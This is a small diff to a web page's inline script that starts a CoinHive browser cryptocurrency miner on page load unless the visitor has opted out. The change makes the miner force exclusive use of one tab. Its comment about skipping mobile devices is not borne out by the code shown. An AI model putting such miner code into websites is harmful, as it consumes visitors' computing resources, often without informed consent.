@@ -11,7 +11,7 @@
         // Only start on non-mobile devices and if not opted-out
         // in the last 14400 seconds (4 hours):
         if (!miner.didOptOut(14400)) {
-            miner.start();
+            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
         }
     </script>
 </body>
